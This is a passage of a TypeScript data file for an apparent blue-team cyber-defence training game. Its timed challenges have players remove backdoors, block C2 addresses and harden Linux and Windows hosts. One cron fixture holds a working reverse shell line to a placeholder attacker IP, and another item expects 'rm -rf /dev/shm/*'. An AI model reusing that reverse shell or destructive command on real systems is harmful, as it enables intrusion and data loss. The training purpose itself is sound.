import { MicrogamePayload } from '../types/game';

export const TUTORIAL_CARD: MicrogamePayload = {
  id: 'tutorial-briefing',
  tier: 1,
  verb: 'MISSION BRIEFING!',
  engine: 'TUTORIAL',
  timeLimitMs: 120000,
  category: 'Windows',
  hint: 'Read the briefing and click START DAILY GAUNTLET',
  educationalNote: "You are the frontline defender. Fast incident response, calm composure under Red Team attacks, and constant communication make champions.",
  payload: {}
};

export const MICROGAME_QUEUE: MicrogamePayload[] = [
  {
    id: 'multi-stage-1',
    tier: 3,
    category: 'Linux',
    educationalNote: "Attackers often lock files with chattr or chmod to prevent you from removing their backdoors. You must first regain permissions, open the file, and manually strip the malicious variables.",
    stages: [
      {
        verb: 'GRANT PERMS!',
        engine: 'CLI_EXEC',
        timeLimitMs: 12000,
        hint: 'chmod 644 /etc/resolv.conf',
        payload: { prompt: 'root@server:~#', successCommands: ['chmod 644 /etc/resolv.conf', 'chmod +w /etc/resolv.conf'] }
      },
      {
        verb: 'OPEN EDITOR!',
        engine: 'CLI_EXEC',
        timeLimitMs: 8000,
        hint: 'nano /etc/resolv.conf',
        payload: { prompt: 'root@server:~#', successCommands: ['nano /etc/resolv.conf', 'vim /etc/resolv.conf'] }
      },
      {
        verb: 'REMOVE MALICIOUS DNS!',
        engine: 'CONFIG_EDIT',
        timeLimitMs: 24000,
        hint: 'Delete the 8.8.8.8 nameserver',
        payload: { filename: '/etc/resolv.conf', initialContent: 'nameserver 10.0.0.1\nnameserver 8.8.8.8\nsearch localdomain', successRegex: '^\\s*nameserver 10\\.0\\.0\\.1[\\r\\n\\s]+search localdomain\\s*$' }
      }
    ]
  },
  {
    id: 'cli-nav-linux',
    tier: 2,
    verb: 'LOCATE BACKDOOR!',
    engine: 'CLI_EXEC',
    timeLimitMs: 16000,
    category: 'Linux',
    hint: 'cd /var/www/html then rm shell.php',
    educationalNote: "Navigation questions test your ability to navigate the filesystem before executing payloads. Attackers frequently drop PHP web shells like 'shell.php' into web root directories (/var/www/html) to maintain persistent HTTP access. Deleting them is step one of containment.",
    payload: { 
      prompt: 'root@web:~#', 
      sequence: [
        { command: 'cd /var/www/html', nextPrompt: 'root@web:/var/www/html#' },
        { command: 'rm shell.php', simulatedOutput: '' }
      ]
    }
  },
  {
    id: 'gui-nav-win',
    tier: 3,
    verb: 'ENABLE DEFENDER!',
    engine: 'GUI_NAV',
    timeLimitMs: 15000,
    category: 'Windows',
    hint: 'Settings then Update & Security then Windows Security then Virus & Threat Protection then Manage Settings then Real-time Protection',
    educationalNote: "Red team's first move upon gaining access to a Windows box is to disable Windows Defender. Re-enabling Real-time protection ensures that known malicious payloads and C2 agents are automatically quarantined before they can execute. You must memorize this settings path to rapidly re-secure Windows boxes.",
    payload: {
      windowTitle: 'Windows Settings',
      steps: [
        { correctOption: 'Update & Security', options: ['System', 'Personalization', 'Update & Security', 'Network & Internet'] },
        { correctOption: 'Windows Security', options: ['Delivery Optimization', 'Windows Security', 'Backup', 'Troubleshoot'] },
        { correctOption: 'Virus & Threat Protection', options: ['Account Protection', 'Firewall & Network', 'Virus & Threat Protection', 'Device Security'] },
        { correctOption: 'Manage Settings', options: ['Scan Options', 'Manage Settings', 'Protection Updates', 'Ransomware Protection'] }
      ],
      finalToggle: { label: 'Real-time Protection' }
    }
  },
  {
    id: 'mc-linux',
    tier: 1,
    verb: 'ANALYZE LOG!',
    engine: 'MULTIPLE_CHOICE',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'Look at the HTTP status code',
    educationalNote: "HTTP status codes tell the story of an attack. A 401 indicates Unauthorized (a failed login attempt), and 404 indicates Not Found (directory brute forcing). A 302 Found or 200 OK after a POST request to a login portal means the attacker successfully guessed the password and was redirected to the dashboard.",
    payload: {
      question: "Which of the following Apache access log entries indicates a SUCCESSFUL brute-force login?",
      options: [
        { text: "192.168.1.50 - - [07/Oct/2026:12:00:01] \"POST /login.php HTTP/1.1\" 401 532", isCorrect: false, feedback: "401 means Unauthorized. The login failed." },
        { text: "192.168.1.50 - - [07/Oct/2026:12:00:05] \"POST /login.php HTTP/1.1\" 403 233", isCorrect: false, feedback: "403 means Forbidden. They didn't get in." },
        { text: "192.168.1.50 - - [07/Oct/2026:12:00:08] \"POST /login.php HTTP/1.1\" 302 0", isCorrect: true },
        { text: "192.168.1.50 - - [07/Oct/2026:12:00:10] \"GET /admin HTTP/1.1\" 404 123", isCorrect: false, feedback: "404 means Not Found. The admin page isn't even there." }
      ]
    }
  },
  {
    id: 'cli-fw',
    tier: 3,
    verb: 'BLOCK IP!',
    engine: 'CLI_EXEC',
    timeLimitMs: 14000,
    category: 'Firewall',
    hint: 'ufw deny from {{IP}}',
    educationalNote: "Rapidly dropping inbound connections from an active C2 IP is step 1 of Incident Response. Uncomplicated Firewall (ufw) is the default frontend for iptables on Ubuntu systems. Memorizing this command is critical to severing a red team member's active connection during an engagement.",
    variables: { IP: ['10.10.10.50', '192.168.1.100', '172.16.5.5', '8.8.8.8'] },
    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw deny from {{IP}}', 'iptables -A INPUT -s {{IP}} -j DROP'], simulatedOutput: 'Rule added\nRule added (v6)' }
  },
  {
    id: 'cfg-linux',
    tier: 2,
    verb: 'NUKE CRON!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: "Delete the top line entirely, leaving only '# DO NOT EDIT'",
    educationalNote: "Crontab is Linux's built-in task scheduler, making it a prime target for persistence. Attackers frequently use crontabs to establish persistent reverse shells that beacon out to their C2 server every minute. Wiping rogue entries from /var/spool/cron ensures the attacker doesn't instantly regain access after you kill their shell.",
    payload: { filename: '/var/spool/cron/crontabs/root', initialContent: '* * * * * /bin/bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"\n# DO NOT EDIT\n', successRegex: '^\\s*#\\s*DO NOT EDIT\\s*$' }
  },
  {
    id: 'cli-win',
    tier: 2,
    verb: 'STOP SMB!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Windows',
    hint: 'Stop-Service -Name {{SERVICE}} -Force',
    educationalNote: "The Server Message Block (SMB) protocol is notoriously exploited for lateral movement across Windows networks using techniques like Pass-the-Hash or EternalBlue. If you suspect an active breach, stopping the LanmanServer service halts SMB traffic entirely, buying you time to patch.",
    variables: { SERVICE: ['LanmanServer', 'LanmanWorkstation'] },
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Stop-Service -Name {{SERVICE}} -Force', 'net stop {{SERVICE}}'], simulatedOutput: 'Service {{SERVICE}} has been stopped successfully.' }
  },
  {
    id: 'cfg-fw',
    tier: 1,
    verb: 'FIX FIREWALL!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 15000,
    category: 'Firewall',
    hint: 'Change ENABLED=no to ENABLED=yes',
    educationalNote: "A classic red team move is to simply disable the UFW service on boot via its configuration file. Leaving a firewall disabled allows an attacker to pivot freely across all ports. Changing 'ENABLED=yes' ensures the firewall applies its default DROP rules upon system restart.",
    payload: { filename: '/etc/ufw/ufw.conf', initialContent: '# /etc/ufw/ufw.conf\nENABLED=no\nLOGLEVEL=low', successRegex: 'ENABLED=yes' }
  },
  {
    id: 'cfg-inject',
    tier: 3,
    verb: 'FIX SMTP RELAY!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 18000,
    category: 'Injects',
    hint: 'Set relayhost to {{RELAY_IP}}',
    educationalNote: "In CCDC, 'Injects' are business tasks you must complete to earn points. A common inject is configuring your local Postfix mail server to route all outbound mail through a central scoring relay. Failing to properly configure the 'relayhost' directive means your team fails the SLA and loses points.",
    variables: { RELAY_IP: ['10.0.0.5', '192.168.1.5', '172.16.0.5'] },
    payload: { filename: '/etc/postfix/main.cf', initialContent: 'smtpd_banner = $myhostname ESMTP\nrelayhost = 0.0.0.0\ninet_interfaces = all', successRegex: 'relayhost = {{RELAY_IP}}' }
  },
  {
    id: 'sb-1',
    tier: 1,
    verb: 'TAKE A BREATH!',
    engine: 'STUDY_BREAK',
    timeLimitMs: 15000,
    category: 'Windows',
    educationalNote: "Just a reminder to breathe! In a real competition, communication is more important than typing fast.",
    payload: { fact: "Fun Fact: The very first CCDC competition was held in 2005. The average time a red team takes to breach an unpatched system is under 15 minutes." }
  },
  {
    id: 'cli-linux-temp',
    tier: 1,
    verb: 'FIND TEMP FILES!',
    engine: 'CLI_EXEC',
    timeLimitMs: 14000,
    category: 'Linux',
    hint: 'find /tmp /var/tmp /dev/shm -type f',
    educationalNote: "Attackers drop staging payloads in /dev/shm or /tmp because they execute in RAM and often avoid disk write logs. Scanning these directories is a crucial first step in threat hunting.",
    payload: { prompt: 'root@server:~#', successCommands: ['find /tmp /var/tmp /dev/shm -type f'] }
  },
  {
    id: 'cli-linux-conn',
    tier: 2,
    verb: 'VIEW CONNECTIONS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Linux',
    hint: 'ss -tulpn',
    educationalNote: "The 'ss -tulpn' command is the fastest way to map out exactly what ports are listening and what processes are bound to them. You must run this immediately to find rogue backdoors.",
    payload: { prompt: 'root@server:~#', successCommands: ['ss -tulpn', 'netstat -tulpn'] }
  },
  {
    id: 'cli-linux-who',
    tier: 1,
    verb: 'WHO IS LOGGED IN?',
    engine: 'CLI_EXEC',
    timeLimitMs: 8000,
    category: 'Linux',
    hint: 'w',
    educationalNote: "Running 'w' or 'who' instantly shows you all active TTY sessions. If you see an unknown IP connected, red team is currently in the box with you.",
    payload: { prompt: 'root@server:~#', successCommands: ['w', 'who'] }
  },
  {
    id: 'cli-win-pass',
    tier: 1,
    verb: 'CHANGE ADMIN PASS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Windows',
    hint: 'net user administrator "{{NEW_PASS}}"',
    educationalNote: "In Phase 1 of CCDC, changing the default Administrator password is the highest priority. If you don't lock them out, the red team will establish persistence in seconds.",
    variables: { NEW_PASS: ['P@ssw0rd123!', 'CyberDefender99!', 'B!u3T3@m2026', 'S3cur3P@ss!'] },
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['net user administrator "{{NEW_PASS}}"'] }
  },
  {
    id: 'cli-win-tasks',
    tier: 2,
    verb: 'LIST ACTIVE TASKS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 15000,
    category: 'Windows',
    hint: 'Get-ScheduledTask -State Running',
    educationalNote: "Scheduled tasks are the number one persistence mechanism on Windows. Listing running tasks will quickly highlight suspicious reverse shells beaconing back to C2.",
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Get-ScheduledTask -State Running', 'schtasks /query /TN * | findstr "Running"'] }
  },
  {
    id: 'cfg-linux-ssh',
    tier: 2,
    verb: 'SECURE SSH PORT!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'Change Port {{ROGUE_PORT}} to Port 22',
    educationalNote: "Attackers often bind SSH to weird high ports to bypass standard firewall rules and hide their traffic. Restoring the default Port 22 is required for business SLAs.",
    variables: { ROGUE_PORT: ['2222', '1337', '8080', '4444', '65535'] },
    payload: { filename: '/etc/ssh/sshd_config', initialContent: 'Port {{ROGUE_PORT}}\nPermitRootLogin no\nPasswordAuthentication yes', successRegex: '\\b[Pp]ort\\s+22\\b' }
  },
  {
    id: 'cfg-linux-sudoers',
    tier: 2,
    verb: 'SECURE SUDOERS!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'Delete the NOPASSWD line entirely',
    educationalNote: "Adding 'NOPASSWD: ALL' for a low-privilege user like www-data allows a compromised web app to instantly execute commands as root without authentication.",
    payload: { filename: '/etc/sudoers', initialContent: 'root ALL=(ALL:ALL) ALL\nwww-data ALL=(ALL) NOPASSWD: ALL', successRegex: '^\\s*root ALL=\\(ALL:ALL\\) ALL\\s*$' }
  },
  {
    id: 'gui-win-startup',
    tier: 2,
    verb: 'CHECK STARTUP APPS!',
    engine: 'GUI_NAV',
    timeLimitMs: 12000,
    category: 'Windows',
    hint: 'Task Manager then Startup',
    educationalNote: "Reviewing the Startup Apps tab in Task Manager is a quick visual way to spot malicious executables that are set to run every time the user logs in.",
    payload: {
      windowTitle: 'Task Manager',
      steps: [
        { correctOption: 'Startup', options: ['Processes', 'Performance', 'App history', 'Startup', 'Users', 'Details', 'Services'] }
      ],
      finalToggle: { label: 'svch0st.exe (Disable)' }
    }
  },
  {
    id: 'gui-win-users',
    tier: 2,
    verb: 'VIEW LOCAL USERS!',
    engine: 'GUI_NAV',
    timeLimitMs: 15000,
    category: 'Windows',
    hint: 'Computer Management then System Tools then Local Users and Groups then Users',
    educationalNote: "Attackers frequently create rogue accounts (like 'BackupAdmin') and add them to the Administrators group. You must check Computer Management to verify accounts.",
    payload: {
      windowTitle: 'Computer Management',
      steps: [
        { correctOption: 'System Tools', options: ['System Tools', 'Storage', 'Services and Applications'] },
        { correctOption: 'Local Users and Groups', options: ['Event Viewer', 'Shared Folders', 'Local Users and Groups', 'Performance', 'Device Manager'] },
        { correctOption: 'Users', options: ['Users', 'Groups'] }
      ],
      finalToggle: { label: 'BackupAdmin (Disable Account)' }
    }
  },
  {
    id: 'mc-conn',
    tier: 2,
    verb: 'ANALYZE CONNECTIONS!',
    engine: 'MULTIPLE_CHOICE',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'Look for an ESTAB connection to a suspicious high port',
    educationalNote: "A reverse shell creates an ESTABLISHED outbound connection from a random local port to the attacker's C2 server port (e.g., 4444, 1337). Web traffic usually bounds to 80/443.",
    payload: {
      question: "Which of the following 'ss -tnp' outputs indicates an active reverse shell?",
      options: [
        { text: "LISTEN 0 128 0.0.0.0:22 0.0.0.0:*", isCorrect: false, feedback: "This is just SSH listening for incoming connections." },
        { text: "ESTAB  0 0 192.168.1.10:80 10.0.0.5:54321", isCorrect: false, feedback: "This is a normal web request coming into your scored port 80." },
        { text: "ESTAB  0 0 192.168.1.10:49281 10.10.10.50:4444", isCorrect: true },
        { text: "TIME-WAIT 0 0 127.0.0.1:3306 127.0.0.1:48192", isCorrect: false, feedback: "This is a closed database connection cleaning up." }
      ]
    }
  },
  {
    id: 'mc-triage',
    tier: 1,
    verb: 'TRIAGE SERVICE DOWN!',
    engine: 'MULTIPLE_CHOICE',
    timeLimitMs: 15000,
    category: 'Firewall',
    hint: 'Always verify the process is actually running before assuming it is a network block.',
    educationalNote: "If the scoring engine reports a service is down, don't immediately panic and flush iptables. The attacker likely just killed the process. Verify it is running first using systemctl or ps.",
    payload: {
      question: "The scoring engine turns RED for your Web Server. What is the FIRST step you should take?",
      options: [
        { text: "Run 'iptables -F' to clear all firewall rules just in case.", isCorrect: false, feedback: "Never flush the firewall blindly. You will expose the entire box." },
        { text: "Check if the Apache/Nginx process is actually running.", isCorrect: true },
        { text: "Change the web administrator password.", isCorrect: false, feedback: "This doesn't bring the service back up." },
        { text: "Reboot the server immediately.", isCorrect: false, feedback: "Rebooting is slow and might trigger persistence mechanisms." }
      ]
    }
  },
  {
    id: 'multi-evict',
    tier: 3,
    category: 'Linux',
    educationalNote: "If you spot an active attacker using 'w', you must find their TTY session (e.g., pts/1) and forcefully kill it. This kicks them out and buys you a few seconds to patch the vulnerability.",
    variables: { TTY: ['1', '2', '3'] },
    stages: [
      {
        verb: 'FIND ATTACKER TTY!',
        engine: 'CLI_EXEC',
        timeLimitMs: 8000,
        hint: 'w',
        payload: { prompt: 'root@server:~#', successCommands: ['w'], simulatedOutput: 'USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    10.0.0.5         13:00    1.00s  0.10s  0.05s -bash\nroot     pts/{{TTY}}    10.10.10.50      13:15    0.00s  0.02s  0.00s bash' }
      },
      {
        verb: 'EVICT ATTACKER!',
        engine: 'CLI_EXEC',
        timeLimitMs: 15000,
        hint: 'pkill -9 -t pts/{{TTY}}',
        payload: { prompt: 'root@server:~#', successCommands: ['pkill -9 -t pts/{{TTY}}', 'pkill -KILL -t pts/{{TTY}}'] }
      }
    ]
  },
  {
    id: 'cli-win-guest',
    tier: 1,
    verb: 'DISABLE GUEST!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Windows',
    hint: 'net user Guest /active:no',
    educationalNote: "The built-in Guest account has historically been abused by attackers for unauthenticated lateral movement. Disabling it is an essential baseline hardening requirement in CCDC.",
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['net user Guest /active:no', 'net user guest /active:no'] }
  },
  {
    id: 'cli-win-killproc',
    tier: 2,
    verb: 'KILL NETCAT!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Windows',
    hint: 'Stop-Process -Name nc -Force',
    educationalNote: "Netcat (nc.exe) is frequently planted as a persistent reverse shell beacon. Forcefully killing the process severs the active command channel immediately.",
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Stop-Process -Name nc -Force', 'taskkill /F /IM nc.exe', 'taskkill /f /im nc.exe'] }
  },
  {
    id: 'cli-linux-suid',
    tier: 2,
    verb: 'AUDIT SUID!',
    engine: 'CLI_EXEC',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'find / -perm -4000 -type f 2>/dev/null',
    educationalNote: "SUID binaries run with the privileges of their owner (root). Threat actors frequently copy /bin/bash or custom tools into /tmp with SUID permissions to maintain root persistence.",
    payload: { prompt: 'root@server:~#', successCommands: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -u=s -type f 2>/dev/null'] }
  },
  {
    id: 'cfg-linux-rootssh',
    tier: 2,
    verb: 'DISABLE ROOT SSH!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 15000,
    category: 'Linux',
    hint: 'Change PermitRootLogin yes to PermitRootLogin no',
    educationalNote: "Allowing direct SSH root logins makes brute-forcing trivial and leaves no user audit trail. Enforcing PermitRootLogin no forces attackers to escalate from an unprivileged user.",
    payload: { filename: '/etc/ssh/sshd_config', initialContent: 'Port 22\nPermitRootLogin yes\nPasswordAuthentication yes', successRegex: 'PermitRootLogin\\s+no' }
  },
  {
    id: 'cli-fw-telnet',
    tier: 1,
    verb: 'BLOCK TELNET!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Firewall',
    hint: 'ufw deny 23',
    educationalNote: "Telnet transmits plaintext credentials over the wire. Port 23 should always be blocked on boundary firewalls unless an inject strictly scores an unencrypted legacy protocol.",
    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw deny 23', 'iptables -A INPUT -p tcp --dport 23 -j DROP'] }
  },
  {
    id: 'cli-fw-default',
    tier: 2,
    verb: 'DEFAULT DENY!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Firewall',
    hint: 'ufw default deny incoming',
    educationalNote: "A proper defensive security perimeter drops all unrequested ingress traffic by default. Once default deny incoming is enabled, you only open ports that are scored by the engine.",
    payload: { prompt: 'root@edge-router:~#', successCommands: ['ufw default deny incoming', 'ufw default deny'] }
  },
  {
    id: 'gui-win-firewall',
    tier: 2,
    verb: 'ENABLE FIREWALL!',
    engine: 'GUI_NAV',
    timeLimitMs: 15000,
    category: 'Windows',
    hint: 'System and Security then Windows Defender Firewall then Turn Windows Defender Firewall on or off',
    educationalNote: "Attackers frequently turn off the local host firewall upon compromising a Windows server. Knowing how to quickly toggle the firewall back on cuts off lateral SMB and RPC scans.",
    payload: {
      windowTitle: 'Windows Defender Firewall',
      steps: [
        { correctOption: 'System and Security', options: ['System and Security', 'Network and Internet', 'Hardware and Sound', 'Programs'] },
        { correctOption: 'Windows Defender Firewall', options: ['Security and Maintenance', 'Windows Defender Firewall', 'System', 'Power Options'] },
        { correctOption: 'Customize Settings', options: ['Allow an app', 'Change notification settings', 'Customize Settings', 'Restore defaults'] }
      ],
      finalToggle: { label: 'Turn on Windows Defender Firewall' }
    }
  },
  {
    id: 'mc-inject-dns',
    tier: 1,
    verb: 'TRIAGE DNS INJECT!',
    engine: 'MULTIPLE_CHOICE',
    timeLimitMs: 15000,
    category: 'Injects',
    hint: 'A DNS query failure should be tested using dig or nslookup against the local nameserver.',
    educationalNote: "Business injects often require troubleshooting internal resolution. If your applications cannot resolve the scoring server hostname, dig or nslookup against your specified nameserver verifies if DNS is reachable.",
    payload: {
      question: "Your CEO inject asks why internal portals cannot reach mail.corp.local. What command directly verifies DNS resolution?",
      options: [
        { text: "ping -c 4 127.0.0.1", isCorrect: false, feedback: "Pinging localhost only tests the local network stack, not DNS resolution." },
        { text: "dig @10.0.0.1 mail.corp.local", isCorrect: true },
        { text: "cat /etc/passwd", isCorrect: false, feedback: "Checking the password file has nothing to do with domain name resolution." },
        { text: "systemctl restart ufw", isCorrect: false, feedback: "Restarting the firewall might disrupt active scored connections." }
      ]
    }
  },
  {
    id: 'multi-hunt-c2',
    tier: 3,
    category: 'Linux',
    educationalNote: "Spotting an active beacon requires querying outbound ESTABLISHED sockets. Once the foreign IP is spotted, dropping outbound traffic to it on the firewall and adding it to /etc/hosts.deny immediately breaks C2 persistence.",
    variables: { C2_IP: ['10.10.10.50', '198.51.100.23', '203.0.113.88'] },
    stages: [
      {
        verb: 'SPOT ACTIVE C2!',
        engine: 'CLI_EXEC',
        timeLimitMs: 9000,
        hint: 'ss -tnp',
        payload: {
          prompt: 'root@server:~#',
          successCommands: ['ss -tnp', 'ss -antp', 'netstat -tnp'],
          simulatedOutput: 'State      Recv-Q Send-Q Local Address:Port Peer Address:Port Process\nESTAB      0      0      192.168.1.10:49281 {{C2_IP}}:4444 users:(("nc",pid=1337,fd=3))'
        }
      },
      {
        verb: 'BLOCK OUTBOUND IP!',
        engine: 'CLI_EXEC',
        timeLimitMs: 12000,
        hint: 'ufw deny out from any to {{C2_IP}}',
        payload: {
          prompt: 'root@server:~#',
          successCommands: [
            'ufw deny out to {{C2_IP}}',
            'ufw deny out from any to {{C2_IP}}',
            'iptables -A OUTPUT -d {{C2_IP}} -j DROP'
          ],
          simulatedOutput: 'Rule added\nRule added (v6)'
        }
      },
      {
        verb: 'ADD TO HOSTS DENY!',
        engine: 'CONFIG_EDIT',
        timeLimitMs: 28000,
        hint: 'Add line "ALL: {{C2_IP}}" to hosts.deny',
        payload: {
          filename: '/etc/hosts.deny',
          initialContent: '# /etc/hosts.deny\n# Global TCP wrapper blacklist\n',
          successRegex: 'ALL\\s*:\\s*{{C2_IP}}'
        }
      }
    ]
  },
  {
    id: 'multi-mysql-triage',
    tier: 2,
    category: 'Linux',
    educationalNote: "Databases should never listen on public interfaces (0.0.0.0). Restricting MySQL to loopback (127.0.0.1) prevents unauthenticated external network attacks like SQL injection pivots or brute-forcing.",
    stages: [
      {
        verb: 'INSPECT MYSQL PORT!',
        engine: 'CLI_EXEC',
        timeLimitMs: 8000,
        hint: 'ss -tulpn | grep 3306',
        payload: {
          prompt: 'root@db-server:~#',
          successCommands: ['ss -tulpn | grep 3306', 'ss -tulpn', 'netstat -tulpn | grep 3306'],
          simulatedOutput: 'tcp  LISTEN 0  128  0.0.0.0:3306  0.0.0.0:*  users:(("mysqld",pid=842,fd=21))'
        }
      },
      {
        verb: 'RESTRICT TO LOCALHOST!',
        engine: 'CONFIG_EDIT',
        timeLimitMs: 24000,
        hint: 'Change bind-address = 0.0.0.0 to bind-address = 127.0.0.1',
        payload: {
          filename: '/etc/mysql/my.cnf',
          initialContent: '[mysqld]\nport = 3306\nbind-address = 0.0.0.0\nmax_connections = 100',
          successRegex: 'bind-address\\s*=\\s*127\\.0\\.0\\.1'
        }
      }
    ]
  },
  {
    id: 'multi-apache-webshell',
    tier: 3,
    category: 'Linux',
    educationalNote: "Attackers drop PHP webshells into upload directories to maintain persistent execution. You must find the file, remove it, and disable PHP execution functions in php.ini.",
    stages: [
      {
        verb: 'LOCATE WEBSHELL!',
        engine: 'CLI_EXEC',
        timeLimitMs: 8000,
        hint: 'ls -la /var/www/html',
        payload: {
          prompt: 'root@web:~#',
          successCommands: ['ls -la /var/www/html', 'ls -la', 'ls /var/www/html'],
          simulatedOutput: 'total 28\n-rw-r--r-- 1 www-data www-data  412 Oct 12 10:00 index.html\n-rwxrwxrwx 1 www-data www-data 8492 Oct 12 10:14 c99.php'
        }
      },
      {
        verb: 'DELETE WEBSHELL!',
        engine: 'CLI_EXEC',
        timeLimitMs: 8000,
        hint: 'rm -f /var/www/html/c99.php',
        payload: {
          prompt: 'root@web:~#',
          successCommands: ['rm -f /var/www/html/c99.php', 'rm /var/www/html/c99.php', 'rm c99.php']
        }
      },
      {
        verb: 'DISABLE PHP EXEC!',
        engine: 'CONFIG_EDIT',
        timeLimitMs: 28000,
        hint: 'Add disable_functions = exec,system to php.ini',
        payload: {
          filename: '/etc/php/8.1/apache2/php.ini',
          initialContent: '[PHP]\nengine = On\nshort_open_tag = Off\n',
          successRegex: 'disable_functions\\s*=\\s*(exec\\s*,\\s*system|system\\s*,\\s*exec)'
        }
      }
    ]
  },
  {
    id: 'multi-win-lateral',
    tier: 2,
    category: 'Windows',
    educationalNote: "When lateral movement is suspected, querying active TCP connections in PowerShell exposes foreign IPs connected to SMB (Port 445). Terminating LanmanServer severs all active SMB pipelines.",
    stages: [
      {
        verb: 'INSPECT CONNECTIONS!',
        engine: 'CLI_EXEC',
        timeLimitMs: 9000,
        hint: 'Get-NetTCPConnection -State Established',
        payload: {
          prompt: 'PS C:\\Windows\\system32>',
          successCommands: [
            'Get-NetTCPConnection -State Established',
            'netstat -ano | findstr ESTABLISHED',
            'netstat -ano'
          ],
          simulatedOutput: 'LocalAddress LocalPort RemoteAddress RemotePort State\n192.168.1.5  445       10.0.0.99     51234      Established'
        }
      },
      {
        verb: 'STOP SMB SERVICE!',
        engine: 'CLI_EXEC',
        timeLimitMs: 15000,
        hint: 'Stop-Service -Name LanmanServer -Force',
        payload: {
          prompt: 'PS C:\\Windows\\system32>',
          successCommands: [
            'Stop-Service -Name LanmanServer -Force',
            'Stop-Service LanmanServer -Force',
            'net stop LanmanServer'
          ],
          simulatedOutput: 'Service LanmanServer stopped successfully.'
        }
      }
    ]
  },
  {
    id: 'cli-linux-devshm',
    tier: 2,
    verb: 'PURGE /DEV/SHM!',
    engine: 'CLI_EXEC',
    timeLimitMs: 12000,
    category: 'Linux',
    hint: 'rm -rf /dev/shm/*',
    educationalNote: 'Attackers often execute malware from /dev/shm (shared memory) because it\'s a tmpfs mount that doesn\'t touch disk, evading traditional AV file scans. Purging it destroys in-memory payloads.',
    payload: { prompt: 'root@victim:~#', successCommands: ['rm -rf /dev/shm/*', 'rm -rf /dev/shm/.*', 'find /dev/shm -type f -delete'] },
  },
  {
    id: 'cli-win-lsa',
    tier: 2,
    verb: 'PROTECT LSASS!',
    engine: 'CLI_EXEC',
    timeLimitMs: 15000,
    category: 'Windows',
    hint: 'Set-ItemProperty for RunAsPPL',
    educationalNote: 'Enabling LSA Protection (RunAsPPL) prevents tools like Mimikatz from dumping credentials from the LSASS process. This is one of the most critical hardening steps on Windows servers.',
    payload: { prompt: 'PS C:\\Windows\\system32>', successCommands: ['Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name RunAsPPL -Value 1', 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f'] },
  },
  {
    id: 'cfg-linux-limits',
    tier: 1,
    verb: 'DISABLE CORE DUMPS!',
    engine: 'CONFIG_EDIT',
    timeLimitMs: 18000,
    category: 'Linux',
    hint: 'Add * hard core 0',
    educationalNote: 'Core dumps can expose sensitive memory contents including passwords and encryption keys. Disabling them with limits.conf prevents attackers from triggering crashes to harvest credentials.',
    payload: { filename: '/etc/security/limits.conf', initialContent: '# /etc/security/limits.conf\n#\n# Each line describes a limit for a user in the form:\n#\n#<domain> <type> <item> <value>\n#\n', successRegex: '\\*\\s+hard\\s+core\\s+0' },
  },
  {
    id: 'cli-fw-tor',
    tier: 2,
    verb: 'BLOCK TOR EXIT!',
    engine: 'CLI_EXEC',
    timeLimitMs: 14000,
    category: 'Firewall',
    hint: 'iptables -A INPUT -s {{IP}} -j DROP',
    variables: { IP: ['185.220.101.42', '104.244.76.13', '199.249.230.163'] },
    educationalNote: 'Tor exit nodes are frequently used by attackers to anonymize C2 traffic and exfiltration. Blocking known exit node IPs at the firewall layer cuts off this anonymization channel.',
    payload: { prompt: 'root@edge-router:~#', successCommands: ['iptables -A INPUT -s {{IP}} -j DROP', 'iptables -I INPUT -s {{IP}} -j DROP', 'iptables -A INPUT -s {{IP}} -j REJECT'] },
  },
  {
    id: 'gui-win-smbsign',
    tier: 2,
    verb: 'ENFORCE SMB SIGNING!',
    engine: 'GUI_NAV',
    timeLimitMs: 20000,
    category: 'Windows',
    hint: 'Local Security Policy > Security Options > SMB Server',
    educationalNote: 'Without SMB signing, attackers can perform NTLM relay attacks to impersonate users and gain unauthorized access. Enforcing digital signatures on all SMB communications neutralizes this attack vector.',
    payload: {
      steps: [
        { label: 'Open Tool', options: ['Local Security Policy', 'Registry Editor', 'Group Policy Editor', 'Device Manager'], correctOption: 'Local Security Policy' },
        { label: 'Navigate To', options: ['Account Policies', 'Local Policies > Security Options', 'User Rights Assignment', 'Windows Firewall'], correctOption: 'Local Policies > Security Options' },
        { label: 'Select Setting', options: ['Microsoft network server: Digitally sign communications (always)', 'Network access: Do not allow anonymous enumeration', 'Interactive logon: Do not display last user name', 'Network security: LAN Manager authentication level'], correctOption: 'Microsoft network server: Digitally sign communications (always)' },
      ],
      finalToggle: { label: 'Enable SMB Signing', correctValue: true },
    },
  },
  {
    id: 'mc-ransomware-triage',
    tier: 3,
    verb: 'CONTAIN RANSOMWARE!',
    engine: 'MULTIPLE_CHOICE',
    timeLimitMs: 18000,
    category: 'Injects',
